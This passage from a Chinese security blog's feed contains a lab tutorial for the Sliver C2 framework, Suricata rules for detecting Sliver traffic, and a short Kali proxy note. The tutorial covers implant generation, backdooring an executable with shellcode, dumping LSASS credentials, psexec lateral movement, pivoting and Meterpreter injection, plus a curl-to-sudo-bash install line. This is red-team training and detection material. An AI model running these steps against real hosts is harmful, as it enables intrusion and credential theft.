Server上修改部分配置。</p><p>&#x2F;etc&#x2F;bind&#x2F;named.conf.local中设置在本地服务器进行递归解析，不发给上游服务器：</p><p><img src="/2023/04/27/file-upload/ic/image-20231117112015962.png" alt="image-20231117112015962"></p><p>&#x2F;etc&#x2F;bind&#x2F;zones&#x2F;db.labnet.local中添加子域名解析NS记录：</p><p><img src="/2023/04/27/file-upload/ic/image-20231117112339166.png" alt="image-20231117112339166"></p><p>配置完成后，在target受害机中查询nslookup.exe prefix.dnsc2.labnet.local，其不会返回 DNS 查询的结果，因为 C2 服务器尚未配置为响应。：</p><p><img src="/2023/04/27/file-upload/ic/image-20231123162101621.png" alt="image-20231123162101621"></p><p>在dns server中查看查询日志：</p><p><img src="/2023/04/27/file-upload/ic/image-20231123162204057.png" alt="image-20231123162204057"></p><p>kali中开启监听：<br><img src="/2023/04/27/file-upload/ic/image-20231123162245419.png" alt="image-20231123162245419"></p><p>此处配置完成。</p><p>在sliver server中创建监听器，这里需要指定监听的域名。官方建议使用FQDN（完全限定域名），因此在一个域名最后添加一个点<code>.</code>，表示根域名。生成 DNS beacon ，指定域名并设定回连间隔为10秒：</p><p><img src="/2023/04/27/file-upload/ic/image-20231123162457100.png" alt="image-20231123162457100"></p><p>在wireshark中查看数据包：</p><p><img src="/2023/04/27/file-upload/ic/image-20231123162836009.png" alt="image-20231123162836009"></p><p>可以看到很多 DNS 查询，大部分是子域<code>dnsc2.labnet.local</code> 的 A 记录，Sliver 使用看似随机的 IP 地址进行响应。</p><p>所有数据实际上都编码在乱码字符串中。当implant想要将数据发送到服务器时，它都必须在它查询的 <code>dnsc2.labnet.local</code> 子域中对其</p><p>进行编码。服务器将接收此查询并返回一些 IP 地址。当服务器想要向implant发送数据时，implant必须执行 TXT 查询，以便服务器可以</p><p>使用数据对其进行响应。</p><h2 id="suricata"><a href="#suricata" class="headerlink" title="suricata"></a>suricata</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.woff</span>:<br>alert tcp any any -&gt; any any (msg: <span class="hljs-string">&quot;Sliver HTTP woff request&quot;</span>; <span class="hljs-attribute">flow</span>:to_server,established;<span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;.woff&quot;</span>;http_uri;pcre: <span class="hljs-string">&quot;/\/(static|assets|fonts|locales)(.*?)((attribute_text_w01_regular|ZillaSlab-Regular\.subset\.bbc33fb47cf6|ZillaSlab-Bold\.subset\.e96c15f68c68|Inter-Regular|Inter-Medium)\.woff)\?[a-z_]&#123;1,2&#125;=[a-z0-9_]&#123;1,10&#125;/i&quot;</span>;sid:<span class="hljs-number">1000001</span>;classtype:trojan-activity; rev:<span class="hljs-number">1</span>;)<br><br><span class="hljs-selector-class">.js</span>:<br>alert tcp any any -&gt; any any (msg: <span class="hljs-string">&quot;Sliver HTTP js request&quot;</span>; <span class="hljs-attribute">flow</span>:to_server,established;<span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;GET&quot;</span>;http_method;nocase;<span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;.js&quot;</span>;http_uri;pcre: <span class="hljs-string">&quot;/\/(js|umd|assets|bundle|bundles|scripts|script|javascripts|javascript|jscript)(.*?)((bootstrap|bootstrap.min|jquery.min|jquery|route|app|app.min|array|backbone|script|email)\.js)\?[a-z_]&#123;1,2&#125;=[a-z0-9_]&#123;1,10&#125;/i&quot;</span>;sid:<span class="hljs-number">1000002</span>;classtype:trojan-activity; rev:<span class="hljs-number">1</span>;)<br><br><span class="hljs-selector-class">.html</span>:<br>alert tcp any any -&gt; any any (msg: <span class="hljs-string">&quot;Sliver HTTP html request&amp;getsessionID&quot;</span>; <span class="hljs-attribute">flow</span>:to_server,established;<span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;POST&quot;</span>;http_method;nocase;<span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;.html&quot;</span>;http_uri;pcre: <span class="hljs-string">&quot;/\/(php|api|upload|actions|rest|v1|oauth2callback|authenticate|oauth2|oauth|auth|database|db|namespaces)(.*?)((login|signin|api|samples|rpc|index|admin|register|sign-up)\.html)\?[a-z_]&#123;1,2&#125;=[a-z0-9_]&#123;1,10&#125;/i&quot;</span>;sid:<span class="hljs-number">1000003</span>;flowbits:set,name;flowbits:noalert;classtype:trojan-activity; rev:<span class="hljs-number">1</span>;)<br><br><span class="hljs-selector-class">.html</span>:<br>alert tcp any any &lt;&gt; any any (msg: <span class="hljs-string">&quot;Sliver HTTP html response&amp;set-cookie&quot;</span>;<span class="hljs-attribute">flow</span>:to_client,established;<span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;Set-Cookie&quot;</span>;http_header;pcre:<span class="hljs-string">&quot;/^Set-Cookie\:\s*(PHPSESSID|SID|SSID|APISID|csrf-state|AWSALBCORS)\=[a-z0-9]&#123;32&#125;\;\s*HttpOnly$/i&quot;</span>;sid:<span class="hljs-number">1000004</span>;flowbits<span class="hljs-selector-pseudo">:is</span>set,name;classtype:trojan-activity;)<br><br><span class="hljs-selector-class">.php</span>:<br>alert tcp any any -&gt; any any (msg: <span class="hljs-string">&quot;Sliver HTTP php request&quot;</span>; <span class="hljs-attribute">flow</span>:to_server,established;<span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;POST&quot;</span>;http_method;nocase;<span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;.php&quot;</span>;http_uri;pcre: <span class="hljs-string">&quot;/\/(php|api|upload|actions|rest|v1|oauth2callback|authenticate|oauth2|oauth|auth|database|db|namespaces)(.*?)((login|signin|api|samples|rpc|index|admin|register|sign-up)\.php)\?[a-z_]&#123;1,2&#125;=[a-z0-9_]&#123;1,10&#125;/i&quot;</span>;sid:<span class="hljs-number">1000005</span>;classtype:trojan-activity; rev:<span class="hljs-number">1</span>;)<br><br><span class="hljs-selector-class">.png</span>:<br>alert tcp any any -&gt; any any (msg: <span class="hljs-string">&quot;Sliver HTTP png request&quot;</span>; <span class="hljs-attribute">flow</span>:to_server,established;<span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;.png&quot;</span>;http_uri;pcre: <span class="hljs-string">&quot;/\/(static|www|assets|images|icons|image|icon|png)(.*?)((favicon|sample|example)\.png)\?[a-z_]&#123;1,2&#125;=[a-z0-9_]&#123;1,10&#125;/i&quot;</span>;sid:<span class="hljs-number">1000006</span>;classtype:trojan-activity; rev:<span class="hljs-number">1</span>;)<br><br>ja3:<br>alert tls any any -&gt; any <span class="hljs-built_in">any</span>(msg:<span class="hljs-string">&quot;sliver https debian&quot;</span>;ja3<span class="hljs-selector-class">.hash</span>;<span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;19e29534fd49dd27d09234e639c4057e&quot;</span>;classtype:misc-activity;sid:<span class="hljs-number">1001</span>;rev:<span class="hljs-number">1</span>)<br><br>alert tls any any &lt;&gt; any <span class="hljs-built_in">any</span>(msg:<span class="hljs-string">&quot;sliver https&quot;</span>;ja3s<span class="hljs-selector-class">.hash</span>;<span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;f4febc55ea12b31ae17cfb7e614afda8&quot;</span>;sid:<span class="hljs-number">1002</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>C2</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sliver教程</title>
    <link href="/2024/07/23/sliver/"/>
    <url>/2024/07/23/sliver/</url>
    
    <content type="html"><![CDATA[<h1 id="sliver"><a href="#sliver" class="headerlink" title="sliver"></a>sliver</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="sliver-C2"><a href="#sliver-C2" class="headerlink" title="sliver C2"></a>sliver C2</h3><p>Sliver 是一个开源的跨平台红队框架，各种规模的组织都可以使用它来进行安全测试。Sliver 的implant支持 Mutual TLS (mTLS)、WireGuard、HTTP(S) 和 DNS上的C2，并使用每个二进制非对称加密密钥进行动态编译。服务器和客户端支持 MacOS、Windows 和Linux。</p><p>sliver提供了两种操作模式：</p><ul><li>Beacon mode：异步通信，1min检查通信情况。</li><li>Session mode：实时会话。</li></ul><h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><p><img src="/2023/04/27/file-upload/-20231019135425500.png" alt="image-20231019135425500"></p><p>如图所示，主要由四个部分组成。</p><ul><li>Sliver C2 console：服务器控制台是主界面，通过 sliver-server 可执行文件启动，所有操作代码都在客户&#x2F;服务器控制台之间共享；服务器控制台通过一个gRPC接口与服务器进行通信。</li><li>Sliver C2 server：Sliver C2 服务器是 sliver-server 可执行文件的一部分，管理内部数据库，启动和停止网络监听器。与服务器交互的主要接口是gRPC接口，所有的功能都是通过它实现的。</li><li>Sliver C2 client console：客户端控制台是用于与Sliver C2服务器互动的主要用户界面。</li><li>Sliver C2 implant： implant是在目标系统上运行的恶意代码（exe、ps1等）。</li></ul><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>Sliver分为server和client，server建议部署在linux上，直接从<a href="https://github.com/BishopFox/sliver">Release v1.5.41 · BishopFox&#x2F;sliver (github.com)</a>下载对应版本即可。</p><p>也可以使用脚本一键安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -q -o- https://sliver.sh/install | <span class="hljs-built_in">sudo</span> bash<br></code></pre></td></tr></table></figure><p>Sliver有两个外部依赖的可选功能： MinGW和Metasploit。</p><ol><li>要启用DLL有效载荷，需要安装MinGW。</li><li>要启用一些MSF集成功能，需要在服务器上安装Metasploit。</li></ol><p>配置文件根据系统不同放在如下位置：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">windows</span>=C:/Users/xxx/.sliver-client/configs/<br><span class="hljs-attr">linux</span>=~/.sliver-client/configs/<br></code></pre></td></tr></table></figure><p>如果只有一个配置文件，直接运行client即可，否则需要先进行import。</p><p>例如<code>./sliver-client-linux import /xxx.cfg</code></p><p>server端默认监听的端口为31337，创建用户配置文件尽量修改默认值。</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">new-operator</span> <span class="hljs-built_in">--name</span> <span class="hljs-string">Jesen</span> <span class="hljs-built_in">--lport</span> <span class="hljs-string">20000</span> <span class="hljs-built_in">--lhost</span> <span class="hljs-string">1</span>.<span class="hljs-string">1</span>.<span class="hljs-string">1</span>.<span class="hljs-string">1</span> <span class="hljs-comment">#创建用户配置文件</span><br><span class="hljs-string">multiplayer</span> -<span class="hljs-string">l</span> <span class="hljs-string">20000</span> <span class="hljs-comment">#启用多用户</span><br></code></pre></td></tr></table></figure><h2 id="Sliver使用"><a href="#Sliver使用" class="headerlink" title="Sliver使用"></a>Sliver使用</h2><h3 id="木马上线示例"><a href="#木马上线示例" class="headerlink" title="木马上线示例"></a>木马上线示例</h3><p>.&#x2F;sliver-server_linux启动服务端：</p><p><img src="/2023/04/27/file-upload/-20231019144740087.png" alt="image-20231019144740087"></p><p>http -l 9001创建监听器：</p><p><img src="/2023/04/27/file-upload/-20231019144907285.png" alt="image-20231019144907285"></p><p>generate –http <a href="http://192.168.126.128:9001/">http://192.168.126.128:9001</a> –os windows 生成implant：</p><p><img src="/2023/04/27/file-upload/-20231019145004511.png" alt="image-20231019145004511"></p><p>这里的url即为server的监听地址，平台选择为windows。</p><p>在受害主机点击implant后，sliver提示连接成功：</p><p><img src="/2023/04/27/file-upload/-20231019145142124.png" alt="image-20231019145142124"></p><p>输入shell命令，即可进入交互式shell执行命令（OPSEC是一个新的红队的攻击规范，提示是因为交互式shell会被记录到对方的历史记录中）：</p><p><img src="/2023/04/27/file-upload/-20231019145644064.png" alt="image-20231019145644064"></p><h3 id="功能详细介绍"><a href="#功能详细介绍" class="headerlink" title="功能详细介绍"></a>功能详细介绍</h3><h4 id="implant"><a href="#implant" class="headerlink" title="implant"></a>implant</h4><p>这里implant跟payload含义类似，下面直接用命令演示：</p><p><code>generate --mtls 192.168.126.128:443 --os windows --arch amd64</code></p><p><img src="/2023/04/27/file-upload/-20231019153239067.png" alt="image-20231019153239067"></p><p>–mtls表示使用mtls协议，注意这里如果使用mtls，后面的监听地址不能加上http不然地址会变成mtls:&#x2F;&#x2F;http:xxx，–os选择平台，–arch代表架构。使用implant命令可以直接查看目前生成的所有implant。</p><p>如果要重新生成，可以使用regenerate命令。</p><h4 id="listener"><a href="#listener" class="headerlink" title="listener"></a>listener</h4><p>在接受回连shell之前，需要先设置好监听器，目前sliver支持下列协议的监听：</p><ul><li>mTLS 相互传输层安全（Mutual TLS）是一个建立加密TLS连接的过程，双方都使用X.509数字证书来验证对方。</li><li>HTTP</li><li>HTTPS</li><li>DNS</li><li>Wireguard</li></ul><p><img src="/2023/04/27/file-upload/-20231019151517292.png" alt="image-20231019151517292"></p><h4 id="sessions"><a href="#sessions" class="headerlink" title="sessions"></a>sessions</h4><p>当shell成功回连后，可以使用use命令选择进入：</p><p><img src="/2023/04/27/file-upload/-20231019153915685.png" alt="image-20231019153915685"></p><p>也可以使用sessions命令：</p><p><img src="/2023/04/27/file-upload/-20231019154130731.png" alt="image-20231019154130731"></p><p>这里可以看到所有会话，并且可以进行kill等操作。</p><h4 id="beacons"><a href="#beacons" class="headerlink" title="beacons"></a>beacons</h4><p>在开头的时候提到，sliver支持两种操作模式，beacon和session，前面所用到的都是session，接下来介绍一下beacon。</p><p>首先生成一个beacon：</p><p><code>generate beacon --http http://192.168.126.128:9001 --os windows</code></p><p><img src="/2023/04/27/file-upload/-20231019154832033.png" alt="image-20231019154832033"></p><p>回连后，可以使用beacons来查看所有beacon或者直接use来选择所有回连的shell。</p><p>beacon默认会每分钟检查一次连接情况，可以进入beacon后info查看：</p><p><img src="/2023/04/27/file-upload/-20231019155704545.png" alt="image-20231019155704545"></p><p>也可以通过beacons watch：</p><p><img src="/2023/04/27/file-upload/-20231019155729510.png" alt="image-20231019155729510"></p><p>如果想要关闭一个beacon，可以通过beacons rm或者beacons prune来自动移除非存活会话，而非kill命令：</p><p><img src="/2023/04/27/file-upload/-20231024134027322.png" alt="image-20231024134027322"></p><p><img src="/2023/04/27/file-upload/-20231024134041449.png" alt="image-20231024134041449"></p><h4 id="armory"><a href="#armory" class="headerlink" title="armory"></a>armory</h4><p>Armory是Sliver Alias and Extension软件包管理器，它允许你自动安装各种第三方工具，如BOF和.NET工具。工具的清单可以在 <a href="https://github.com/sliverarmory/armory/blob/master/armory.json">Github</a> 上找到。<br>安装第三方工具命令如下：</p><p><code>armory install rubeus</code></p><p>首先更新一下索引：</p><p><img src="/2023/04/27/file-upload/-20231019180223957.png" alt="image-20231019180223957"></p><p>接着安装需要的工具即可。</p><h4 id="multiplayer"><a href="#multiplayer" class="headerlink" title="multiplayer"></a>multiplayer</h4><p>要开启多操作员模式，首先需要在server端生成客户端配置文件：</p><p><code>new-operator --name ry4n_win --lhost 192.168.126.128 --lport 20000</code></p><p><img src="/2023/04/27/file-upload/-20231019172900127.png" alt="image-20231019172900127"></p><p>server端开启对应端口：</p><p><code>multiplayer -l 20000</code></p><p><img src="/2023/04/27/file-upload/-20231019172938523.png" alt="image-20231019172938523"></p><p>默认端口为31337，这里设置为20000.</p><p>在client端，首先导入配置文件：</p><p><code>sliver-client_windows.exe import .\ry4n_win_192.168.126.128.cfg</code></p><p><img src="/2023/04/27/file-upload/-20231019173027415.png" alt="image-20231019173027415"></p><p>成功连接：</p><p><img src="/2023/04/27/file-upload/-20231019173045704.png" alt="image-20231019173045704"></p><h3 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h3><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><h5 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h5><p>use选择session后，通过shell命令进入交互式shell：</p><p><img src="/2023/04/27/file-upload/-20231023155817041.png" alt="image-20231023155817041"></p><h5 id="execute命令"><a href="#execute命令" class="headerlink" title="execute命令"></a>execute命令</h5><p>execute -o 执行单条命令：</p><p><img src="/2023/04/27/file-upload/-20231023155833561.png" alt="image-20231023155833561"></p><p>execute 这种方式不会在主机上留下日志，其本质是执行shell文件夹下的一个文件间接去执行命令，不是直接的命令执行。因此很多命令都会提示 no such file or directory 或者 file does not exist。</p><p>即：在环境变量中的命令可以使用这种方式去执行，不在其中的就不可以。</p><h5 id="runas命令"><a href="#runas命令" class="headerlink" title="runas命令"></a>runas命令</h5><p>runas命令需要结合-u,-P,-p参数，启动一个新的进程运行指定命令。</p><p><img src="/2023/04/27/file-upload/-20231023155944605.png" alt="image-20231023155944605"></p><h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><h5 id="getsystem"><a href="#getsystem" class="headerlink" title="getsystem"></a>getsystem</h5><p>这里利用getsystem进行演示，最新版的win11提权失败。</p><p><img src="/2023/04/27/file-upload/-20231023160427453.png" alt="image-20231023160427453"></p><h4 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h4><h5 id="migrate"><a href="#migrate" class="headerlink" title="migrate"></a>migrate</h5><p>在sliver中，进程迁移时会产生一个新的session。</p><p>首先ps查看进程列表：</p><p><img src="/2023/04/27/file-upload/-20231023162852719.png" alt="image-20231023162852719"></p><p>migrate -p进行进程迁移，这里选择11680：</p><p><img src="/2023/04/27/file-upload/-20231023162917736.png" alt="image-20231023162917736"></p><p>可以看到，迁移之前，当前session的pid保持不变，但是use命令查看可用进程时，多了一个11680pid的新session。</p><h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><h5 id="backdoor"><a href="#backdoor" class="headerlink" title="backdoor"></a>backdoor</h5><p><img src="/2023/04/27/file-upload/-20231024160349034.png" alt="image-20231024160349034"></p><p>首先需要生成一个profile作为shellcode：</p><p><code>profiles new --http http://192.168.126.128 --os windows --arch amd64 --format shellcode windows-shellcode</code></p><p><img src="/2023/04/27/file-upload/-20231024160836657.png" alt="image-20231024160836657"></p><p><code>backdoor --profile windows-shellcode &quot;C:\Users\Ry4n\Desktop\calc.exe&quot;</code></p><p><img src="/2023/04/27/file-upload/-20231024160845782.png" alt="image-20231024160845782"></p><p>注入成功后查看calc.exe:</p><img src="sliver/image-20231024160947509.png" alt="image-20231024160947509" style="zoom:50%;" /><p>大小为16.2m。运行后上线：</p><p><img src="/2023/04/27/file-upload/-20231024161138381.png" alt="image-20231024161138381"></p><h4 id="凭据访问"><a href="#凭据访问" class="headerlink" title="凭据访问"></a>凭据访问</h4><h5 id="procdump"><a href="#procdump" class="headerlink" title="procdump"></a>procdump</h5><p>先通过ps找到lsass进程：</p><p><img src="/2023/04/27/file-upload/-20231023165932394.png" alt="image-20231023165932394"></p><p>pid为1268。（这里需要权限为system）</p><p>接下来使用procdump命令,-p表示target pid：</p><p><code>procdump -p 1268</code>:</p><p><img src="/2023/04/27/file-upload/-20231023170029876.png" alt="image-20231023170029876"></p><h5 id="pypykatz"><a href="#pypykatz" class="headerlink" title="pypykatz"></a>pypykatz</h5><p>接下来利用pypykatz进行解密：</p><p><code>pypykatz lsa minidump lsass.dump</code>:</p><p><img src="/2023/04/27/file-upload/-20231023170126512.png" alt="image-20231023170126512"></p><p>获得凭据信息。</p><p>这里如果解密失败，出现报错<code>All detection methods failed</code>，是因为在新版windows中，LSASS 转储中 AES 和 TDES 密钥的正确签名和偏移量已经更改，将pypykatz更新到0.6.8之后版本即可。</p><h4 id="网络探测"><a href="#网络探测" class="headerlink" title="网络探测"></a>网络探测</h4><p><code>execute -o powershell &quot;Get-NetNeighbor | Where-Object -Property State -NE &quot;Unreachable&quot; | Select-Object -Property IPAddress&quot;</code></p><p><img src="/2023/04/27/file-upload/-20231024104007096.png" alt="image-20231024104007096"></p><h4 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h4><h5 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h5><p>-h查看相关命令：</p><p><img src="/2023/04/27/file-upload/-20231024104205839.png" alt="image-20231024104205839"></p><p>首先生成配置文件：</p><p><code>profiles new --format service --skip-symbols --mtls 192.168.126.128 win-svc64</code></p><p><img src="/2023/04/27/file-upload/-20231024104237238.png" alt="image-20231024104237238"></p><p><code>psexec -s test_service -p win-svc64 192.168.126.1</code></p><p><img src="/2023/04/27/file-upload/-20231024104358433.png" alt="image-20231024104358433"></p><p>这里只有单台机器的环境，仅作操作演示，执行后会在C:&#x2F;temp目录下上传一个随机命名的exe文件，并且开启一个名为test_service的服务：</p><p><img src="/2023/04/27/file-upload/-20231024104526738.png" alt="image-20231024104526738"></p><h4 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h4><h5 id="socks5"><a href="#socks5" class="headerlink" title="socks5"></a>socks5</h5><p>不同于cs的代理在server端，Sliver的代理是开在<strong>本地客户端！！！</strong></p><p>通过内置的socks命令，开启一个sock5代理：</p><p><img src="/2023/04/27/file-upload/-20231024110641052.png" alt="image-20231024110641052"></p><p>失陷主机开启一个simple http服务模拟web服务，另一网段的机器访问受害主机，在未开启代理时无法访问：</p><p><img src="/2023/04/27/file-upload/-20231024110437329.png" alt="image-20231024110437329"></p><p>在sliver server开启socks5代理后，通过socks5代理访问：</p><p><img src="/2023/04/27/file-upload/-20231024110614526.png" alt="image-20231024110614526"></p><p>如果想终止代理，stop命令即可：</p><p><img src="/2023/04/27/file-upload/-20231024110808468.png" alt="image-20231024110808468"></p><p>这里是将代理的ip设置为了server另一张网卡，通过与该网卡同一网段的机器进行内网的访问。</p><p>下面直接启用一个客户端，在客户端开启127.0.0.1的本地代理进行访问。</p><p>首先按照前面的步骤开启多操作员模式，并且运行client，开启socks5代理：</p><p><img src="/2023/04/27/file-upload/-20231024141416340.png" alt="image-20231024141416340"></p><p>没开代理时无法访问：</p><p><img src="/2023/04/27/file-upload/-20231024140848147.png" alt="image-20231024140848147"></p><p>开启本地代理：</p><p><img src="/2023/04/27/file-upload/-20231024141027254.png" alt="image-20231024141027254"></p><h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><h5 id="portfwd"><a href="#portfwd" class="headerlink" title="portfwd"></a>portfwd</h5><p>portfwd add命令可以实现端口转发，默认转发到本地8080端口：</p><p><img src="/2023/04/27/file-upload/-20231024142207735.png" alt="image-20231024142207735"></p><h5 id="wg-portfwd"><a href="#wg-portfwd" class="headerlink" title="wg-portfwd"></a>wg-portfwd</h5><p>这种方式仅限于wg协议的implant。</p><p>首先生成implant并且成功连接：</p><p><img src="/2023/04/27/file-upload/-20231024150628911.png" alt="image-20231024150628911"></p><p><code>wg-portfwd add -r ip</code>来添加一条代理：</p><p><img src="/2023/04/27/file-upload/-20231024150702740.png" alt="image-20231024150702740"></p><p>wg-config查看一下当前配置：</p><p><img src="/2023/04/27/file-upload/-20231024150753598.png" alt="image-20231024150753598"></p><p>这里最后一个值endpoint，需要改为wg监听的ip:port</p><p><img src="/2023/04/27/file-upload/-20231024150906277.png" alt="image-20231024150906277"></p><p>将配置文件保存。</p><p>下面以windows端举例，安装WireGuard，导入.conf文件：</p><p><img src="/2023/04/27/file-upload/-20231024150949990.png" alt="image-20231024150949990"></p><p>成功连接。</p><p>这里将受害主机的http服务进行了转发，通过如下ip访问：</p><p><img src="/2023/04/27/file-upload/-20231024151044199.png" alt="image-20231024151044199"></p><p><img src="/2023/04/27/file-upload/-20231024151102965.png" alt="image-20231024151102965"></p><p>成功。</p><h4 id="pivots"><a href="#pivots" class="headerlink" title="pivots"></a>pivots</h4><h5 id="TCP-pivot"><a href="#TCP-pivot" class="headerlink" title="TCP pivot"></a>TCP pivot</h5><p>以tcp pivots举例，目前pivots只能在session模式下使用。</p><p>在一个session中，pivots tcp:</p><p><img src="/2023/04/27/file-upload/-20231024152334775.png" alt="image-20231024152334775"></p><p>生成一个tcp的pivot，接下来生成一个新的implant：</p><p><code>generate --tcp-pivot 192.168.126.128:9898 --save pivot.exe</code></p><p><img src="/2023/04/27/file-upload/-20231024152524748.png" alt="image-20231024152524748"></p><p>接着将该implant植入域内其他主机即可，即将当前session当作跳板机来使用。</p><h4 id="联动msf"><a href="#联动msf" class="headerlink" title="联动msf"></a>联动msf</h4><h5 id="在当前进程执行msf-payload"><a href="#在当前进程执行msf-payload" class="headerlink" title="在当前进程执行msf payload"></a>在当前进程执行msf payload</h5><p><img src="/2023/04/27/file-upload/-20231024155719870.png" alt="image-20231024155719870"></p><p>执行命令<code>msf -L 192.168.126.128 -l 1234 -m meterpreter_reverse_https</code></p><p>在msf中设置ip port payload一致之后，exploit：</p><p><img src="/2023/04/27/file-upload/-20231024155753056.png" alt="image-20231024155753056"></p><p>成功在msf上线。</p><h5 id="将msf-payload注入到指定进程中"><a href="#将msf-payload注入到指定进程中" class="headerlink" title="将msf payload注入到指定进程中"></a>将msf payload注入到指定进程中</h5><p>通过-p参数指定要注入的pid：</p><p><img src="/2023/04/27/file-upload/-20231024160043320.png" alt="image-20231024160043320"></p><p><code>msf-inject -L 192.168.126.128 -l 1234 -m meterpreter_reverse_https -p 7960</code></p><p><img src="/2023/04/27/file-upload/-20231024160122995.png" alt="image-20231024160122995"></p><p>成功将payload注入到pid为7960的进程中。</p><h2 id="默认配置"><a href="#默认配置" class="headerlink" title="默认配置"></a>默认配置</h2><p>配置文件中，默认端口为31337，建议进行修改。</p><p><img src="/2023/04/27/file-upload/-20231024131541328.png" alt="image-20231024131541328"></p>]]></content>
    
    
    <categories>
      
      <category>C2</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kali通过物理机clash代理上网</title>
    <link href="/2024/07/23/kali%E9%80%9A%E8%BF%87%E7%89%A9%E7%90%86%E6%9C%BAclash%E4%BB%A3%E7%90%86%E4%B8%8A%E7%BD%91/"/>
    <url>/2024/07/23/kali%E9%80%9A%E8%BF%87%E7%89%A9%E7%90%86%E6%9C%BAclash%E4%BB%A3%E7%90%86%E4%B8%8A%E7%BD%91/</url>
    
    <content type="html"><![CDATA[<h1 id="kali通过物理机clash代理上网"><a href="#kali通过物理机clash代理上网" class="headerlink" title="kali通过物理机clash代理上网"></a>kali通过物理机clash代理上网</h1><p><img src="/2023/04/27/file-upload/20231018164952298.png" alt="image-20231018164952298"></p><p>物理机开启Allow LAN。</p><p>点击Allow LAN，查看ip：</p><p><img src="/2023/04/27/file-upload/20231018165057181.png" alt="image-20231018165057181"></p><p>这里是192.168.0.1:7890.</p><p>在kali中修改~&#x2F;.zshrc文件，插入：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">https_proxy</span>=http://192.168.0.1:7890<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">http_proxy</span>=http://192.168.0.1:7890<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">all_proxy</span>=socks5://192.168.0.1:7890<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/20231018165148442.png" alt="image-20231018165148442"></p><p>测试：</p><p><img src="/2023/04/27/file-upload/20231018165221508.png" alt="image-20231018165221508"></p><p>成功。</p>]]></content>
    
    
    <categories>
      
      <category>clash</category>
      
    </categories>
    
    
    <tags>
      
      <tag>clash</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JumpServer远程代码执行漏洞(CVE-2024-29201,CVE-2024-29202)复现</title>
    <link href="/2024/07/23/JumpServer%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-29201,CVE-2024-29202)%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/07/23/JumpServer%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-29201,CVE-2024-29202)%E5%A4%8D%E7%8E%B0/</url>
    
